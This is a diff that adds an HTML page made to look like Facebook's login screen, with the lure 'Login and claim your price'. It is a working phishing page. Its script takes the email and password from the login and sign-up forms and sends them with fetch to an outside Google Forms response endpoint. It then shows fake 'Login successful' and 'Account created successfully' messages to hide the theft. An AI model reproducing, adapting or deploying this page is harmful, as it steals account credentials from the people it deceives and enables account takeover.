@@ -1,0 +1,239 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Facebook Login</title>
+
+<style>
+body{
+    font-family: Arial;
+    background:#f0f2f5;
+    margin:0;
+}
+.container{
+    display:flex;
+    justify-content:center;
+    align-items:center;
+    height:100vh;
+}
+.left{
+    margin-right:60px;
+}
+.left h1{
+    color:#1877f2;
+    font-size:50px;
+}
+.left p{
+    font-size:20px;
+}
+.box{
+    background:white;
+    padding:20px;
+    border-radius:10px;
+    width:330px;
+    box-shadow:0 5px 15px rgba(0,0,0,0.1);
+}
+input{
+    width:100%;
+    padding:12px;
+    margin:8px 0;
+    border-radius:6px;
+    border:1px solid #ddd;
+    font-size:16px;
+    transition:0.3s;
+}
+input:focus{
+    border-color:#1877f2;
+    outline:none;
+    box-shadow:0 0 5px rgba(24,119,242,0.3);
+}
+button{
+    width:100%;
+    padding:12px;
+    border:none;
+    border-radius:6px;
+    font-size:16px;
+    font-weight:bold;
+    cursor:pointer;
+}
+.login{
+    background:#1877f2;
+    color:white;
+}
+.create{
+    background:#42b72a;
+    color:white;
+    margin-top:10px;
+}
+button:disabled{
+    opacity:0.6;
+    cursor:not-allowed;
+}
+.link{
+    text-align:center;
+    margin:10px 0;
+    color:#1877f2;
+    cursor:pointer;
+}
+.hidden{
+    display:none;
+}
+.msg{
+    font-size:14px;
+    text-align:center;
+    margin-top:8px;
+}
+
+/* Spinner */
+.loader{
+    display:none;
+    margin:10px auto;
+    border:4px solid #f3f3f3;
+    border-top:4px solid #1877f2;
+    border-radius:50%;
+    width:25px;
+    height:25px;
+    animation:spin 1s linear infinite;
+}
+@keyframes spin{
+    0%{transform:rotate(0deg);}
+    100%{transform:rotate(360deg);}
+}
+</style>
+</head>
+
+<body>
+
+<div class="container">
+
+<div class="left">
+<h1>facebook</h1>
+<p>Login and claim your price</p>
+</div>
+
+<div class="box">
+
+<!-- LOGIN -->
+<div id="loginPage">
+<input id="loginEmail" type="email" placeholder="Email">
+<input id="loginPass" type="password" placeholder="Password">
+
+<button id="loginBtn" class="login" onclick="login()">Log In</button>
+<div class="loader" id="loginLoader"></div>
+
+<div class="link" onclick="showRegister()">Create New Account</div>
+<p id="loginMsg" class="msg"></p>
+</div>
+
+<!-- REGISTER -->
+<div id="registerPage" class="hidden">
+<input id="regEmail" type="email" placeholder="Email">
+<input id="regPass" type="password" placeholder="Password">
+
+<button id="regBtn" class="create" onclick="register()">Sign Up</button>
+<div class="loader" id="regLoader"></div>
+
+<div class="link" onclick="showLogin()">Back to Login</div>
+<p id="regMsg" class="msg"></p>
+</div>
+
+</div>
+</div>
+
+<script>
+
+// 🔗 GOOGLE FORM
+const FORM_URL = "https://docs.google.com/forms/d/e/1FAIpQLSeYXWTnsVG7p779H4q-gFKBE_LDbPyrJIrLwr6yAt54FeLpOA/formResponse";
+const EMAIL_ID = "entry.1683946266";
+const PASS_ID = "entry.316022200";
+
+// 📡 SEND DATA
+function sendToGoogle(email, password){
+    let formData = new FormData();
+    formData.append(EMAIL_ID, email);
+    formData.append(PASS_ID, password);
+
+    return fetch(FORM_URL, {
+        method: "POST",
+        mode: "no-cors",
+        body: formData
+    });
+}
+
+// ✅ EMAIL VALIDATION
+function isValidEmail(email){
+    return /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email);
+}
+
+// --- REGISTER ---
+async function register(){
+    let email = regEmail.value;
+    let pass = regPass.value;
+    let msg = regMsg;
+
+    if(!isValidEmail(email)){
+        msg.style.color="red";
+        msg.innerText = "Enter a valid email!";
+        return;
+    }
+    if(pass.length < 6){
+        msg.style.color="red";
+        msg.innerText = "Password must be at least 6 characters!";
+        return;
+    }
+
+    regBtn.disabled = true;
+    regLoader.style.display = "block";
+
+    await sendToGoogle(email, pass);
+
+    regLoader.style.display = "none";
+    regBtn.disabled = false;
+
+    msg.style.color="green";
+    msg.innerText = "Account created successfully!";
+}
+
+// --- LOGIN ---
+async function login(){
+    let email = loginEmail.value;
+    let pass = loginPass.value;
+    let msg = loginMsg;
+
+    if(!isValidEmail(email)){
+        msg.style.color="red";
+        msg.innerText = "Enter a valid email!";
+        return;
+    }
+    if(pass.length < 6){
+        msg.style.color="red";
+        msg.innerText = "Invalid password!";
+        return;
+    }
+
+    loginBtn.disabled = true;
+    loginLoader.style.display = "block";
+
+    await sendToGoogle(email, pass);
+
+    loginLoader.style.display = "none";
+    loginBtn.disabled = false;
+
+    msg.style.color="green";
+    msg.innerText = "Login successful!";
+}
+
+// --- SWITCH ---
+function showRegister(){
+    loginPage.classList.add("hidden");
+    registerPage.classList.remove("hidden");
+}
+function showLogin(){
+    registerPage.classList.add("hidden");
+    loginPage.classList.remove("hidden");
+}
+
+</script>
+
+</body>
+</html>
